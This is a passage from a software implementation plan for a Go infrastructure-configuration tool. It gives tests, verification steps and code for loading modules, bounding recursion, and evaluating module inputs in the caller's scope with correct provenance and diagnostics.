		"infra.yml": "project: demo\nresources:\n  prod:\n    type: module.outer\n",
		// `helper` is discoverable from the ROOT, and `outer` tries to use it
		// without loading it.
		"outer/module.yml":  "resources:\n  inner:\n    type: module.helper\n",
		"helper/module.yml": "resources:\n  h:\n    type: test.thing\n",
	})

	_, ds := Expand(decl, variables.Scope{}, dir, paths{})
	if !hasFragment(ds, "no module named \"helper\" is loaded") {
		t.Errorf("a module must declare its own dependencies; got %+v", ds)
	}
	if !hasFragment(ds, "module prod") {
		t.Errorf("the diagnostic must say which instantiation the problem is inside; got %+v", ds)
	}
	_ = strings.TrimSpace
}
```

Drop the `strings` import and the trailing `_ = strings.TrimSpace` if `go vet` objects.

#### 4.7 Verify each guard is actually reached

This is the check M3 skipped: invariant 4's test once passed 20/20 with its dependency
edge deleted. Break each guard and confirm the right test fails.

```bash
# 1. Delete the cycle check. TestExpandRefusesACycleAndShowsIt must HANG or
#    fail, not pass. Use a timeout so an infinite recursion is a failure:
go test -count=1 -timeout 30s -run TestExpandRefusesACycleAndShowsIt ./internal/modules/
# 2. Delete the depth check. TestExpandRefusesNestingDeeperThanMaxDepth fails.
# 3. Swap the two checks. TestExpandReportsACycleAsACycle... fails.
# 4. Change `>=` to `>` in the depth check. The MaxDepth test fails.
# 4b. Push to w.path in loadModules as well as instantiate — an implementation
#    that counts LOADS. TestManySiblingModulesNeverTripTheDepthBound fails while
#    TestExpandRefusesNestingDeeperThanMaxDepth still passes, which is the whole
#    point of the pair (Amendment 12b).
# 5. Remove the `defer` that pops the path. The diamond test fails.
# 6. In loadModules, apply discovered modules AFTER the explicit loop so they
#    overwrite. TestAnExplicitModulesEntryBeatsADiscoveredOneSilently fails.
# 7. In discover, drop the skipDirs check. TestDiscoverySkipsDotDirectories fails.
# 7b. In record, append to a slice instead of keying by source identity.
#    TestResolutionsAreCollectedDeduplicatedAndSorted fails on the duplicate.
#    Then delete sortedResolutions' sort and run it 20 times — it must fail at
#    least once, because `resolved` is a map.
# 7c. Delete record's KindPath skip. TestLocalPathsProduceNoResolutions fails.
# 8. In loadModules, drop the `len(module) == 0` guard.
#    TestDiscoveryDoesNotReachInsideAModule fails.
# Restore each before moving on.
```

If any of those eight still passes, the test is not pinning what it names. Fix the test
before continuing.

#### 4.8 Confirm the YAML containment rule still holds

Ruling 2's one-command check. This must print nothing:

```bash
grep -rn "yaml\." --include=*.go internal/ pkg/ cmd/ | grep -v "^internal/config/"
```

#### 4.9 Commit

```bash
go test -count=1 ./... && go vet ./... && gofmt -l .
git add internal/modules/expand.go internal/modules/expand_test.go \
  internal/modules/discover.go internal/modules/discover_test.go \
  internal/modules/testdata_test.go \
  internal/registry/registry.go internal/registry/registry_test.go
git commit -m "M5 task 4: load modules, find instantiations, bound the recursion" -- \
  internal/modules/expand.go internal/modules/expand_test.go \
  internal/modules/discover.go internal/modules/discover_test.go \
  internal/modules/testdata_test.go \
  internal/registry/registry.go internal/registry/registry_test.go
```

---

---

## Task 5 — evaluate a module call's inputs in the caller's scope, and fill `ScopeModuleDefault`

### Why this task exists

`ScopeModuleDefault` has been declared and unused since M4 Task 1, sitting in the ladder
between `ScopeBaseConfig` and `ScopeEnvironmentInherit`. Amendment 8 removed the
ambiguity about what fills it — a caller's input is now an ordinary attribute — leaving
exactly one filler: the module's own declared `default:`. A rung with no filler is a
ladder whose ordering is a claim nobody tests.

The second failure is what the ordering fixture in 5.1 exists for: evaluating a call's
attribute in the MODULE's scope instead of the caller's. Both scopes usually resolve the
same name to something, so the wrong one produces a plausible value rather than an error
— a module reusable only by callers who happen to spell their variables the way it spells
its inputs.

**What Amendment 8b deleted, and what it did not.** It deleted Amendment 5b: stage 5 does
not re-stamp an evaluated value's `Scope`. It did NOT delete input evaluation. Stage 5
runs before stage 6 and cannot build the module's scope without the caller's value in
hand; after expansion the module-call resource is gone, so stage 6 never sees it. Stage 5
makes the same three calls `bindAttribute` makes — `Parse`, `Qualify`, `Evaluate` — and
keeps whatever provenance comes back. Same code path; one step fewer.

### Files

- modify `internal/modules/expand.go`
- create `internal/modules/inputs.go`
- create `internal/modules/inputs_test.go`
- modify `internal/variables/schema.go`, `internal/variables/schema_test.go`,
  `internal/variables/resolve.go`, `internal/variables/resolve_test.go`

### Interfaces

**Consumes:**

```go
func expressions.Parse(src string, origin value.Origin) (*value.Expr, diag.Diagnostics)
func expressions.Evaluate(e *value.Expr, scope expressions.Scope) (value.Value, diag.Diagnostics)
type expressions.Scope interface {
	Variable(name string) (value.Value, bool)
	Attribute(ref value.Reference) (value.Value, bool)
}
func variables.Schemas(decls []config.VariableDecl, noun string) (map[string]variables.Schema, diag.Diagnostics)
func (variables.Schema) Coerce(v value.Value) (value.Value, diag.Diagnostics)
func (variables.Schema) Validate(v value.Value) diag.Diagnostics
func (s *variables.Scope) Override(name string, v value.Value)
```

**Produces** — Tasks 6, 7 and 10 depend on exactly these:

```go
package modules

// Scope is the name environment inside one module instantiation.
type Scope struct {
	Module []string        // the instantiation path, outermost first; empty at the root
	Vars   variables.Scope // the variables visible inside this level
}

func (s *Scope) Variable(name string) (value.Value, bool)          // expressions.Scope
func (s *Scope) Attribute(ref value.Reference) (value.Value, bool) // expressions.Scope

type Instance struct {
	Decl  *config.ResourceDecl
	Scope *Scope
}

var variables.ProcessVariables = []string{"account", "environment", "region"}
```

`Instance.Scope` is a POINTER and every resource at one level shares one. The names table
Task 7 adds is a property of the level, not of each resource; copying it per resource
would allocate a map whose entries can never differ.

### The rulings this task fixes, and why

1. **A call's attributes are evaluated in the CALLER's scope**, before the module's scope
   exists at all. They are written at the call site and name things at the call site.

2. **Only the module's declared `default:` fills `ScopeModuleDefault`**, stamped
   `value.SourceDefault` — the same pairing M4 ruled for a variable's default.
   `value.SourceModule` is not used here; Task 7 uses it for outputs, which is the
   direction a value actually crosses a module boundary.

3. **An evaluated value's `Scope` is never re-stamped** (Amendment 8b). A literal comes
   through as stage 2 left it, a `${count}` from `--var` keeps `ScopeCLIOverride` because
   `Evaluate` returns the variable's own `Value`. Measured at HEAD: a literal attribute is
   `ScopeUnset`, not `ScopeBaseConfig` as Amendment 8b states, and
   `pkg/value/format.go:246` renders the two identically for `SourceExplicit`. So the
   ruling holds and the reason is consistency — stage 5 must not invent a difference
   between `replicas: 3` on a module call and `size: large` on a `test.database`.

4. **A module sees its own inputs plus the three process variables, and nothing else.**
   `environment`, `region` and `account` are facts about the invocation rather than the
   caller's configuration — `variables.Scope.Override`'s doc comment already names
   exactly those three, and `compiler.seedProcessVariables` argues that a `--var` cannot
   even change `environment`. Confirmed by Amendment 9; §11.3 says so. Everything else
   comes in through `inputs:`, or a module's requirements would be invisible at its call
   site and it would break when moved to another project.

5. **An attribute the module does not declare, and a declared input with neither a value
   nor a default, are both errors** — and both still resolve to a poison value. §7.4: a
   stage continues past an error using a poison value where it can, so one missing input
   is not reported again at every use site.

6. **An unset input's unknown carries its DECLARED kind** (Amendment 2), mirroring
   `internal/variables/resolve.go:327`. Anything else discards the one piece of type
   information the declaration exists to carry, makes an unset input behave differently
   from an unset variable one stage earlier, and leaves `value.Coerce`'s unknown branch
   unreachable — that branch is guarded by a numeric cross-kind case, so it fires only
   for an unknown already claiming `KindInt` or `KindFloat`.

7. **Type checking goes through `variables.Schema`, unchanged.** `Coerce` then `Validate`,
   in that order — load-bearing for the same reason as in `variables.Resolve`:
   `compareBounds` reads both sides in the declared kind, so an uncoerced value is not
   merely mistyped, it is silently unbounded.

### Steps

#### 5.1 Failing tests

Create `internal/modules/inputs_test.go`:

```go
package modules

import (
	"strings"
	"testing"

	"github.com/infrata/infrata/internal/variables"
	"github.com/infrata/infrata/pkg/value"
)

// scopeOf returns the scope the named resource was instantiated at.
func scopeOf(t *testing.T, exp *Expansion, name string) *Scope {
	t.Helper()
	for _, inst := range exp.Instances {
		if inst.Decl.Name == name {
			return inst.Scope
		}
	}
	t.Fatalf("no instance named %q in %d instances", name, len(exp.Instances))
	return nil
}

// callerVars builds a root variable scope with one variable resolved, standing
// in for what stage 4 hands stage 5.
func callerVars(name string, v value.Value) variables.Scope {
	var s variables.Scope
	s.Override(name, v)
	s.Override("environment", value.String("dev", value.SourceEnvironment).
		WithScope(value.ScopeCLIOverride).WithSuppliedBy("the environment argument"))
	return s
}

const moduleWithReplicas = `
inputs:
  replicas:
    type: integer
    default: 1
resources:
  worker:
    type: test.thing
`

func TestCallersInputBeatsTheModulesDeclaredDefault(t *testing.T) {
	decl, dir := fixture(t, map[string]string{
		"infra.yml": `
project: demo
modules:
  - ./m
resources:
  app:
    type: module.m
    replicas: 7
`,
		"m/module.yml": moduleWithReplicas,
	})

	exp, ds := Expand(decl, variables.Scope{}, dir, paths{})
	if ds.HasErrors() {
		t.Fatalf("unexpected diagnostics: %+v", ds)
	}

	got, ok := scopeOf(t, exp, "worker").Variable("replicas")
	if !ok {
		t.Fatal("the module's input must be visible as a variable inside it")
	}
	if n, _ := got.AsInt(); n != 7 {
		t.Errorf("replicas = %v, want 7 — the caller's explicit value, not the default", got.Raw)
	}
	if got.Scope == value.ScopeModuleDefault {
		t.Error("a caller's explicit input must NOT be stamped ScopeModuleDefault; that rung " +
			"is the module's own default, and inverting the two inverts \"explicit config " +
			"always wins over an implicit default\"")
	}
}

func TestUnsuppliedInputTakesTheDeclaredDefaultAtScopeModuleDefault(t *testing.T) {
	decl, dir := fixture(t, map[string]string{
		"infra.yml":    "project: demo\nmodules:\n  - ./m\nresources:\n  app:\n    type: module.m\n",
		"m/module.yml": moduleWithReplicas,
	})

	exp, ds := Expand(decl, variables.Scope{}, dir, paths{})
	if ds.HasErrors() {
		t.Fatalf("unexpected diagnostics: %+v", ds)
	}

	got, ok := scopeOf(t, exp, "worker").Variable("replicas")
	if !ok {
		t.Fatal("an unsupplied input with a default must still be in scope")
	}
	if n, _ := got.AsInt(); n != 1 {
		t.Errorf("replicas = %v, want the declared default 1", got.Raw)
	}
	// The rung reserved since M4 Task 1 and unpopulated until now.
	if got.Scope != value.ScopeModuleDefault {
		t.Errorf("replicas scope = %v, want ScopeModuleDefault — the module's own default is "+
			"the ONLY thing that fills that rung", got.Scope)
	}
	if got.Source != value.SourceDefault {
		t.Errorf("replicas source = %v, want SourceDefault", got.Source)
	}
}

// Amendment 8b: stage 5 keeps whatever provenance evaluation produced. Deleted
// from 5b was the re-stamping, not the evaluation.
func TestCallerSuppliedInputKeepsTheProvenanceOfWhatSuppliedIt(t *testing.T) {
	decl, dir := fixture(t, map[string]string{
		"infra.yml": `
project: demo
modules:
  - ./m
resources:
  app:
    type: module.m
    replicas: ${count}
`,
		"m/module.yml": moduleWithReplicas,
	})

	vars := callerVars("count", value.Int(9, value.SourceVariable).
		WithScope(value.ScopeCLIOverride).WithSuppliedBy("--var"))

	exp, ds := Expand(decl, vars, dir, paths{})
	if ds.HasErrors() {
		t.Fatalf("unexpected diagnostics: %+v", ds)
	}

	got, _ := scopeOf(t, exp, "worker").Variable("replicas")
	if n, _ := got.AsInt(); n != 9 {
		t.Errorf("replicas = %v, want 9", got.Raw)
	}
	if got.Scope != value.ScopeCLIOverride {
		t.Errorf("replicas scope = %v, want ScopeCLIOverride — a module boundary is a point "+
			"where it is tempting to re-derive provenance, and the rule is that provenance "+
			"is recorded where a value ENTERS, not where it is passed along", got.Scope)
	}
	if value.ScopeLabel(got) != "--var" {
		t.Errorf("ScopeLabel = %q, want %q", value.ScopeLabel(got), "--var")
	}
}

// The ordering fixture for this task. `size` is bound in BOTH scopes, to
// different values, so the two candidate implementations disagree and the
// assertion can tell them apart. A fixture where the name existed in only one
// scope would pass against either.
func TestInputIsEvaluatedInTheCallersScopeNotTheModules(t *testing.T) {
	decl, dir := fixture(t, map[string]string{
		"infra.yml": `
project: demo
modules:
  - ./m
resources:
  app:
    type: module.m
    chosen: ${size}
`,
		"m/module.yml": `
inputs:
  size:
    type: string
    default: from-the-module
  chosen:
    type: string
resources:
  worker:
    type: test.thing
`,
	})

	vars := callerVars("size", value.String("from-the-caller", value.SourceVariable).
		WithScope(value.ScopeBaseConfig))

	exp, ds := Expand(decl, vars, dir, paths{})
	if ds.HasErrors() {
		t.Fatalf("unexpected diagnostics: %+v", ds)
	}

	got, _ := scopeOf(t, exp, "worker").Variable("chosen")
	s, _ := got.AsString()
	if s == "from-the-module" {
		t.Fatal("the call's attributes were evaluated in the MODULE's scope; they are written " +
			"at the call site and name things at the call site")
	}
	if s != "from-the-caller" {
		t.Fatalf("chosen = %q, want %q", s, "from-the-caller")
	}
}

func TestModuleDoesNotSeeTheCallersVariables(t *testing.T) {
	decl, dir := fixture(t, map[string]string{
		"infra.yml":    "project: demo\nmodules:\n  - ./m\nresources:\n  app:\n    type: module.m\n",
		"m/module.yml": moduleWithReplicas,
	})

	vars := callerVars("caller_only", value.String("x", value.SourceVariable))

	exp, ds := Expand(decl, vars, dir, paths{})
	if ds.HasErrors() {
		t.Fatalf("unexpected diagnostics: %+v", ds)
	}
	scope := scopeOf(t, exp, "worker")

	if _, ok := scope.Variable("caller_only"); ok {
		t.Error("a module must not see the caller's variables; its requirements would then be " +
			"invisible at the call site and it would break when moved to another project")
	}
	if _, ok := scope.Variable("environment"); !ok {
		t.Error("a module must see `environment`: it is a fact about the invocation, not the " +
			"caller's configuration, and a --var cannot even change it (§11.3)")
	}
}

func TestUndeclaredAttributeOnAModuleCallIsRefused(t *testing.T) {
	decl, dir := fixture(t, map[string]string{
		"infra.yml": `
project: demo
modules:
  - ./m
resources:
  app:
    type: module.m
    replicase: 3
`,
		"m/module.yml": moduleWithReplicas,
	})

	_, ds := Expand(decl, variables.Scope{}, dir, paths{})
	if !hasFragment(ds, "module \"m\" has no input \"replicase\"") {
		t.Errorf("a typo'd input must be refused, not silently dropped in favour of the "+
			"default; got %+v", ds)
	}
	if !hasFragment(ds, "replicas") {
		t.Errorf("the diagnostic must list the inputs the module does declare; got %+v", ds)
	}
}

func TestRequiredInputWithNoValueAndNoDefaultIsRefused(t *testing.T) {
	decl, dir := fixture(t, map[string]string{
		"infra.yml": "project: demo\nmodules:\n  - ./m\nresources:\n  app:\n    type: module.m\n",
		"m/module.yml": `
inputs:
  image:
    type: string
resources:
  worker:
    type: test.thing
`,
	})

	exp, ds := Expand(decl, variables.Scope{}, dir, paths{})
	if !hasFragment(ds, "module \"app\" requires input \"image\"") {
		t.Errorf("an input with no default and no value must be refused; got %+v", ds)
	}

	// Reported AND resolved to a poison value (§7.4), so that every expression
	// reading it does not ALSO report "undefined variable".
	got, ok := scopeOf(t, exp, "worker").Variable("image")
	if !ok {
		t.Fatal("a missing required input must still leave a value of the right shape in " +
			"scope, or one mistake is reported once per use site")
	}
	if got.Known {
		t.Error("nothing supplied it, so there is nothing to know")
	}
	if got.Kind != value.KindString {
		t.Errorf("kind = %v, want the DECLARED kind", got.Kind)
	}
}

// Contract Amendment 2. The declared kind is the whole point: it makes
// value.Coerce's numeric cross-kind branch reachable, and it keeps an unset
// input behaving like an unset variable.
func TestUnsetInputCarriesItsDeclaredKindNotKindString(t *testing.T) {
	decl, dir := fixture(t, map[string]string{
		"infra.yml": "project: demo\nmodules:\n  - ./m\nresources:\n  app:\n    type: module.m\n",
		"m/module.yml": `
inputs:
  count:
    type: integer
resources:
  worker:
    type: test.thing
`,
	})

	exp, _ := Expand(decl, variables.Scope{}, dir, paths{})
	got, ok := scopeOf(t, exp, "worker").Variable("count")
	if !ok {
		t.Fatal("count is not in scope")
	}
	if got.Kind != value.KindInt {
		t.Errorf("kind = %v, want KindInt. An unknown STRING here would discard the one piece "+
			"of type information `type: integer` exists to carry, and would leave "+
			"value.Coerce's unknown branch unreachable — it is guarded by a numeric "+
			"cross-kind case", got.Kind)
	}
	if got.Raw != nil {
		t.Error("Value's contract is that Raw is nil when Known is false")
	}
}

func TestInputIsTypeCheckedThroughTheVariableSchema(t *testing.T) {
	decl, dir := fixture(t, map[string]string{
		"infra.yml": `
project: demo
modules:
  - ./m
resources:
  app:
    type: module.m
    replicas: plenty
`,
		"m/module.yml": moduleWithReplicas,
	})

	_, ds := Expand(decl, variables.Scope{}, dir, paths{})
	if !ds.HasErrors() {
		t.Fatal("a string supplied for an integer input must be refused")
	}
	// variables.Schema.Validate's own wording, with the noun threaded. The
	// fragment asserts both halves at once: that no second type checker was
	// built (the sentence is Validate's), and that the message names what the
	// user actually wrote.
	if !hasFragment(ds, `input "replicas" must be an integer`) {
		t.Errorf("the input must be checked by variables.Schema and reported as an INPUT; got %+v", ds)
	}
	for _, d := range ds {
		if strings.Contains(d.Summary, `variable "replicas"`) {
			t.Errorf("the diagnostic calls it a variable (%q). The user wrote an attribute on a "+
				"module call; naming the wrong construct is spec §44 failing at the last hop, "+
				"after every stage upstream got it right", d.Summary)
		}
		// A module input literal carries Scope=unset, and this validator renders
		// ScopeLabel into a sentence. Step 5.3 is what stops "The value supplied
		// by unset is a string" — a clause naming the ABSENCE of provenance as
		// though it were a source the user could act on.
		if strings.Contains(d.Detail, "unset") {
			t.Errorf("Detail = %q names an unset scope; a module input is the first value to "+
				"reach this validator without a stamped scope", d.Detail)
		}
	}
}
```

#### 5.2 Run them, see them fail

```bash
go test -count=1 ./internal/modules/
```

Expect a build failure: `undefined: Scope`, and `inst.Scope` undefined on `Instance`.

#### 5.3 Thread the declaration noun into `variables.Schema`'s diagnostics

Ruling 3 reuses `config.VariableDecl` for a module's `inputs:`, and that reuse leaks:
every message in `internal/variables/schema.go` says "variable" for something the user
wrote under `inputs:`. Author A already threaded a noun through stage 2's decoder so
`decodeVariable`'s messages say "input"; the messages `Schema.Validate` and
`Schema.Coerce` produce do not, and those are the ones stage 5 emits.

This is the M4 shape again. That round's finding was a diagnostic naming `--var` for a
value supplied by `--var-file`: everything upstream was right and the last hop named the
wrong construct, which is spec §44's "say what is wrong" failing where the user reads it.

**Check first whether `config.VariableDecl` already carries a noun field** — Author A's
stage-2 threading may have put it there. If so, `Schemas` reads it and takes no
parameter. What follows assumes it does not.

In `internal/variables/schema.go`:

```go
type Schema struct {
	Name string
	// Noun is what the user called this declaration: "variable" or "input".
	// The two are the same SHAPE — PLAN.md §11 spells a module's `inputs:`
	// exactly as `variables:` — which is why one Schema serves both. They are
	// not the same WORD, and every diagnostic below reaches a user who wrote
	// one of them and not the other.
	//
	// Read through noun(), never directly: the zero value must keep meaning
	// "variable", so a Schema built by hand in a test — or by a future caller
	// that has not thought about this — reports the common case rather than an
	// empty string in the middle of a sentence.
	Noun string
	Kind value.Kind
	// ... the rest unchanged
}

// noun returns what to call this declaration in a diagnostic, defaulting to
// "variable".
func (s Schema) noun() string {
	if s.Noun == "" {
		return "variable"
	}
	return s.Noun
}
```

```go
// Schemas builds the schema table from stage 2's declarations.
//
// noun is what the user called these declarations — "variable" for infra.yml's
// `variables:` block, "input" for a module's `inputs:`. The two share this type
// because PLAN.md §11 gives them the same shape (Ruling 3), so the word is the
// one thing that cannot be shared and must be carried.
func Schemas(decls []config.VariableDecl, noun string) (map[string]Schema, diag.Diagnostics) {
	// ...
	s := Schema{Name: d.Name, Noun: noun, Kind: d.Type, Origin: d.Origin}
	// ... unchanged
```

Replace the literal `"variable "` in every diagnostic in that file with `s.noun()+" "` —
seven sites: `Coerce`'s lossy-conversion error, `Validate`'s kind mismatch, `boundDiag`,
`malformed`, `malformedBound`, and `ParseText`'s two. The `--var` ones stay correct
without special-casing: a module input cannot be set by `--var`, so `Resolve` is their
only caller and it passes `"variable"`.

**The same three sites also need the `unset` sentence fixed, and it is this milestone that
makes it reachable.** All three render `value.ScopeLabel(v)` into prose — `"The value
supplied by " + ScopeLabel(v) + " is …"` — and `ScopeUnset.String()` is `"unset"`. Every
variable carries a scope stamped by stage 4, so this is dead today; a module input literal
carries `Scope=unset` and reaches the same validator the moment the `Noun` threading above
lands. Reproduced at HEAD:

    Declared as integer at module.yml:3:5. The value supplied by unset is a string.

Fix the sentence; do NOT stamp a scope at stage 5 to make it read well. Inventing a claim
about where a value came from is exactly what Amendment 8b deleted, and the rule does not
stop applying when the honest answer is "nothing recorded it". Add beside `show`:

```go
// suppliedBy renders the " supplied by X" clause of a diagnostic, or nothing at
// all when the value carries no provenance.
//
// A value can genuinely have none: stage 2 stamps Source and leaves Scope
// alone, so a literal written in a configuration file arrives at ScopeUnset —
// and ScopeUnset.String() is "unset", which reads as a noun in this sentence
// and produces "The value supplied by unset is a string." Nothing reached this
// before M5, because every variable carries a scope stamped by stage 4; a
// module input is the first value to reach this validator without one.
//
// The alternative — having stage 5 stamp ScopeBaseConfig so the sentence reads
// well — would invent a claim about where the value came from, which is the
// thing contract Amendment 8b deleted. Saying less is the honest fix.
func suppliedBy(v value.Value) string {
	if v.Scope == value.ScopeUnset {
		return ""
	}
	return " supplied by " + value.ScopeLabel(v)
}
```

and rewrite the three clauses (`Coerce` at :217, `Validate` at :268, `boundDiag` at :333):

```go
	// Coerce
	Detail: "The value" + suppliedBy(v) + " is " + show(v) +
		", which cannot be converted to " + s.Kind.String() + " without changing it. " +
		strconv.Quote(s.Name) + " is declared at " + s.Origin.String() + ".",

	// Validate
	Detail: "Declared as " + s.Kind.String() + " at " + s.Origin.String() +
		". The value" + suppliedBy(v) + " is " + article(v.Kind) + " " + v.Kind.String() + ".",

	// boundDiag
	Detail: "The value" + suppliedBy(v) + " is " + show(v) + ". The bound is declared at " +
		originOr(bound.Origin, s.Origin).String() + ".",
```

`ScopeLabel` stays the only way this file names a scope — `suppliedBy` wraps it rather
than replacing it, so M4's MAJOR 1 fix (preferring `SuppliedBy` over `Scope.String()` so a
`--var-file` value is not credited to `--var`) still applies wherever there IS a scope.
The two regression tests at `schema_test.go:262` and `:553` pass values with real scopes
and stay green.

Add to `internal/variables/schema_test.go`:

```go
func TestNoDiagnosticNamesAnUnsetScope(t *testing.T) {
	s := Schema{Name: "replicas", Noun: "input", Kind: value.KindInt,
		Origin: value.Origin{File: "module.yml", Line: 3, Column: 5}}
	// Exactly what stage 2 produces for a literal attribute: Source explicit,
	// Scope unset, no SuppliedBy.
	ds := s.Validate(value.String("large", value.SourceExplicit))
	if !ds.HasErrors() {
		t.Fatal("a string against an integer schema must be refused")
	}
	if strings.Contains(ds[0].Detail, "unset") {
		t.Errorf("Detail = %q; \"supplied by unset\" reads as a noun and names a thing the "+
			"user cannot act on. A value with no recorded provenance gets a sentence with "+
			"no clause, not a clause naming the absence", ds[0].Detail)
	}
	if !strings.Contains(ds[0].Detail, "The value is a string") {
		t.Errorf("Detail = %q, want the clause omitted entirely", ds[0].Detail)
	}
}

func TestTheSuppliedByClauseSurvivesWhereThereIsAScope(t *testing.T) {
	// The omission must be narrow. Dropping the clause unconditionally would
	// undo M4's MAJOR 1 fix, which exists so a --var-file value is not credited
	// to --var.
	s := Schema{Name: "replicas", Kind: value.KindInt,
		Origin: value.Origin{File: "infra.yml", Line: 3, Column: 5}}
	v := value.String("large", value.SourceVariable).
		WithScope(value.ScopeCLIOverride).WithSuppliedBy("conf/prod.yml")
	ds := s.Validate(v)
	if !strings.Contains(ds[0].Detail, "supplied by conf/prod.yml") {
		t.Errorf("Detail = %q, want it to name the file that supplied the value", ds[0].Detail)
	}
}
```

In `internal/variables/resolve.go`: `schemas, schemaDiags := Schemas(decls, "variable")`.

Add to `internal/variables/schema_test.go`:

```go
func TestSchemaDiagnosticsUseTheDeclarationsOwnNoun(t *testing.T) {
	decls := []config.VariableDecl{{
		Name:   "replicas",
		Type:   value.KindInt,
		Origin: value.Origin{File: "module.yml", Line: 3, Column: 5},
	}}
	schemas, _ := Schemas(decls, "input")

	ds := schemas["replicas"].Validate(value.String("plenty", value.SourceExplicit))
	if !ds.HasErrors() {
		t.Fatal("a string against an integer schema must be refused")
	}
	if !strings.Contains(ds[0].Summary, `input "replicas"`) {
		t.Errorf("Summary = %q, want it to call this an input", ds[0].Summary)
	}
	if strings.Contains(ds[0].Summary, "variable") {
		t.Errorf("Summary = %q, still calls it a variable", ds[0].Summary)
	}
}

func TestSchemaWithNoNounStillSaysVariable(t *testing.T) {
	// A Schema built by hand — in a test, or by a caller that has not thought
	// about the noun — must read as the common case, not as an empty word
	// dropped into the middle of a sentence.
	s := Schema{Name: "replicas", Kind: value.KindInt}
	ds := s.Validate(value.String("plenty", value.SourceExplicit))
	if !strings.Contains(ds[0].Summary, `variable "replicas"`) {
		t.Errorf("Summary = %q, want the zero Noun to mean \"variable\"", ds[0].Summary)
	}
}
```

Every existing assertion passes `"variable"` through `Resolve`, so nothing should move:

```bash
go test -count=1 ./internal/variables/ ./internal/compiler/
```

#### 5.4 The process-variable list

`internal/modules` must not hardcode the three names `compiler.seedProcessVariables`
seeds, or the two lists drift and a module silently stops seeing one. Put the list where
`variables.Scope.Override`'s doc comment already describes it.

Add to `internal/variables/resolve.go`, above `Override`:

```go
// ProcessVariables names the three variables that come from the process
// invocation rather than from any configuration file, sorted.
//
// Listed here, once, because two places need the same list and a second copy
// would drift: compiler.seedProcessVariables sets them, and internal/modules
// carries them across a module boundary (a module sees these and its own
// inputs, and nothing else — PLAN.md §11.3). Override's doc comment below has
// always named exactly these three; this is that sentence made readable by a
// caller.
var ProcessVariables = []string{"account", "environment", "region"}
```

Add to `internal/variables/resolve_test.go`:

```go
func TestProcessVariablesMatchesWhatOverrideDocuments(t *testing.T) {
	want := []string{"account", "environment", "region"}
	if len(ProcessVariables) != len(want) {
		t.Fatalf("ProcessVariables = %v, want %v", ProcessVariables, want)
	}
	for i := range want {
		if ProcessVariables[i] != want[i] {
			t.Fatalf("ProcessVariables = %v, want %v (sorted, so consumers need no sort)",
				ProcessVariables, want)
		}
	}
}
```

Tasks 8–10 should make `seedProcessVariables` iterate it; that is their file and is noted
rather than done here.

#### 5.5 The scope type and input resolution

Create `internal/modules/inputs.go`:

```go
package modules

import (
	"sort"
	"strconv"
	"strings"

	"github.com/infrata/infrata/internal/config"
	"github.com/infrata/infrata/internal/diag"
	"github.com/infrata/infrata/internal/expressions"
	"github.com/infrata/infrata/internal/variables"
	"github.com/infrata/infrata/pkg/value"
)

// Scope is the name environment inside one module instantiation: the variables
// visible to it, and (Task 7) what each bare name in ${name.attr} binds to.
//
// Every resource instantiated at one level shares ONE Scope, by pointer. The
// bindings are a property of the level, not of each resource, and copying them
// per resource would allocate a map whose entries could never differ.
//
// It satisfies expressions.Scope, so it is what compiler stage 6 evaluates a
// resource's attributes against. One scope type serves both stages, which is
// what stops the two from disagreeing about what a name means.
type Scope struct {
	// Module is the instantiation path to this level, outermost first, empty
	// at the root.
	Module []string
	// Vars is what ${name} resolves to here: the module's own inputs plus the
	// three process variables, or the project's whole variable scope at the
	// root.
	Vars variables.Scope
}

// Variable satisfies half of expressions.Scope.
func (s *Scope) Variable(name string) (value.Value, bool) { return s.Vars.Variable(name) }

// Attribute satisfies the other half. At compile time no resource has been
// created, so every reference to one reports unavailable — which is what turns
// it into an unknown carrying its expression, and simultaneously what makes the
// dependency edge discoverable.
//
// Module outputs never reach here: Task 7's Qualify folds them into the
// expression tree before it is evaluated, precisely so this method has one
// answer rather than two.
func (s *Scope) Attribute(value.Reference) (value.Value, bool) { return value.Value{}, false }

// moduleScope builds the scope inside one instantiation: its resolved inputs,
// plus the process variables carried across from the caller.
//
// caller is the scope the module call is written in. lv is the module's own
// level, whose Inputs say what it accepts. supplied is the call's attributes,
// already evaluated in the caller's scope.
func (w *walker) moduleScope(
	r *config.ResourceDecl, lv level, caller *Scope,
	supplied map[string]value.Value, module []string,
) *Scope {
	inner := &Scope{Module: module}

	// The three facts about the invocation cross every module boundary, each
	// copied as-is, keeping the provenance the compiler stamped. A module that
	// rendered ${environment} as having come from its own inputs would claim an
	// origin that does not exist.
	for _, name := range variables.ProcessVariables {
		if v, ok := caller.Variable(name); ok {
			inner.Vars.Override(name, v)
		}
	}

	moduleName := strings.TrimPrefix(r.Type, TypePrefix)
	schemas, schemaDiags := variables.Schemas(lv.Inputs, "input")
	w.ds.Extend(schemaDiags)

	// An attribute the module does not declare. Reported before the declared
	// ones are resolved, so a typo is not reported a second time as a missing
	// required input.
	for _, name := range sortedAttributeNames(r.Attributes) {
		if _, declared := schemas[name]; declared {
			continue
		}
		w.ds.Add(diag.Diagnostic{
			Severity: diag.SeverityError,
			Summary:  "module " + strconv.Quote(moduleName) + " has no input " + strconv.Quote(name),
			Detail:   "Inputs it declares:\n  " + strings.Join(inputNames(lv.Inputs), "\n  "),
			Action: "Correct the name, or declare " + strconv.Quote(name) +
				" under that module's `inputs:`.",
			Origin: r.Attributes[name].Origin,
		})
	}

	// lv.Inputs is sorted by name (stage 2), so diagnostics about several bad
	// inputs come out in a stable order with no sort here.
	for _, d := range lv.Inputs {
		s := schemas[d.Name]
		v, ok := supplied[d.Name]
		if !ok {
			if !s.HasDefault {
				w.ds.Add(diag.Diagnostic{
					Severity: diag.SeverityError,
					Summary: "module " + strconv.Quote(r.Name) + " requires input " +
						strconv.Quote(d.Name),
					Detail: strconv.Quote(d.Name) + " is declared at " + s.Origin.String() +
						" with no `default:`, so every instantiation must supply it.",
					Action: "Add `" + d.Name + ":` to this module call, or give the input a `default:`.",
					Origin: r.Origin,
				})
				// Reported AND resolved to a poison value of the DECLARED kind
				// (§7.4), so one missing input is not reported again at every
				// use site. The kind mirrors
				// internal/variables/resolve.go:327, which stamps an unset
				// variable's declared kind the same way (Amendment 2).
				inner.Vars.Override(d.Name, value.Unknown(s.Kind, value.SourceModule).
					WithScope(value.ScopeModuleDefault).
					WithOrigin(s.Origin))
				continue
			}
			// THE rung. Ruling 3: the module's own declared default is the only
			// thing that fills ScopeModuleDefault, and it is stamped here
			// rather than in variables.Schemas because a declaration is not a
			// resolution — only the stage that decides which level won may say
			// which level won.
			inner.Vars.Override(d.Name, s.Default.
				WithSource(value.SourceDefault).
